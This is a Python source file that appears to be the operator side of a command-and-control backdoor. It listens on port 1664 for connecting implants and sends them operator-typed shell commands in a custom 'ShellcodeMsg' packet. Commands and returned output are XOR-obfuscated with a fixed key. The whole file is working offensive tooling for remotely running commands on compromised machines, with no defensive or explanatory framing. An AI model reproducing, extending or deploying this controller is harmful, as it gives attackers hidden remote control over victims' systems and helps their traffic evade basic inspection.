import socket
import time
import struct

# Command definitions matching the client
cmd_exec = 0b001
cmd_exit = 0b010
cmd_wait = 0b100
cipher_key = 0xFF  # Example cipher key for XOR
buffer_size = 1024

format_string = f'BB{buffer_size}s'

class ShellcodeMsg:
    def __init__(self, command=0, key=0, buffer='', buffer_size=256):
        self.command = command  # 1 byte
        self.key = key          # 1 byte
        self.buffer_size = buffer_size  # Fixed size of the buffer
        
        # Ensure the buffer is a bytes object
        if isinstance(buffer, str):
            buffer = buffer.encode('utf-8')  # Encode string to bytes
        elif not isinstance(buffer, bytes):
            raise ValueError("buffer must be a string or bytes")

        # Set buffer_length as the actual content length of the buffer
        self.buffer_length = len(buffer)
        
        if len(buffer) > buffer_size:
            print(f"Warning: buffer truncated to {buffer_size} bytes.")
            self.buffer = buffer[:buffer_size]  # Truncate if too long
        else:
            self.buffer = buffer.ljust(buffer_size, b'\x00')  # Pad with null bytes if too short

    def pack(self):
        """Pack the structure into a bytes object."""
        # Pack format: command (1 byte), key (1 byte), buffer_length (4 bytes, little-endian), buffer (buffer_size)
        format_string = f'<BBI{self.buffer_size}s'
        return struct.pack(format_string, self.command, self.key, self.buffer_length, self.buffer)
    
    @classmethod
    def unpack(cls, data):
        """Unpack a bytes object into a ShellcodeMsg instance."""
        # Unpack command (1 byte), key (1 byte), and buffer_length (4 bytes, little-endian)
        command, key, buffer_length = struct.unpack_from('<BBI', data)
        
        # Calculate the buffer size from the total length minus the fixed fields
        buffer_size = len(data) - 6  # 1 byte for command, 1 byte for key, 4 bytes for buffer_length
        
        # Unpack the buffer with the calculated size
        buffer_format = f'{buffer_size}s'
        buffer = struct.unpack_from(buffer_format, data, offset=6)[0]
        
        return cls(command=command, key=key, buffer=buffer[:buffer_length], buffer_size=buffer_size)
    
    def __repr__(self):
        return (f'ShellcodeMsg(command={self.command}, key={self.key}, '
                f'buffer_length={self.buffer_length}, '
                f'buffer="{self.buffer.decode("utf-8", errors="ignore").rstrip()[:10]}...", '
                f'buffer_size={self.buffer_size})')


def xor_cipher(data, key):
    """Encrypts/Decrypts data using XOR with a single-byte key."""
    if isinstance(data, str):
        data = data.encode('utf-8')  # Convert string to bytes        
    return bytes([b ^ key for b in data])  # Apply XOR for each byte

# Client handling function
def handle_client(client_socket, client_address):
    try:
        print(f"[+] Accepted connection from {client_address[0]}:{client_address[1]}")
        while True:
            print("cmd (exec, wait, exit) > ", end='', flush=True)
            user_input = input().strip()

            if user_input == "exit":
                msg = ShellcodeMsg(command=cmd_exit)
                client_socket.send(msg.pack())
                print("[*] Sent exit command.")
                break
            elif user_input == "wait":
                msg = ShellcodeMsg(command=cmd_wait)
                client_socket.send(msg.pack())
                print("[*] Sent wait command.")
            elif user_input == "exec":
                print("cmdline > ", end='', flush=True)
                command = input().strip()
                buffer = xor_cipher(command, cipher_key)
                msg = ShellcodeMsg(command=cmd_exec, key=cipher_key, buffer=buffer)
                client_socket.send(msg.pack())
                print("[*] Sent exec command.")

                # Receive output from the client
                output = client_socket.recv(buffer_size)
                output = xor_cipher(output, cipher_key)
                print(f"[+] Output: {output}")
            else:
                print(f"[!] Invalid option: {user_input}")
                continue

            # Small delay to avoid tight loop
            time.sleep(0.2)

    except Exception as e:
        print(f"[!] Error handling client {client_address[0]}:{client_address[1]}: {e}")

    finally:
        print(f"[*] Client {client_address[0]}:{client_address[1]} disconnected.")
        client_socket.close()

# Server startup function
def start_server(server_ip, server_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(f"[*] Server listening on {server_ip}:{server_port}")

    while True:
        client_socket, client_address = server.accept()
        handle_client(client_socket, client_address)

if __name__ == "__main__":
    start_server("0.0.0.0", 1664)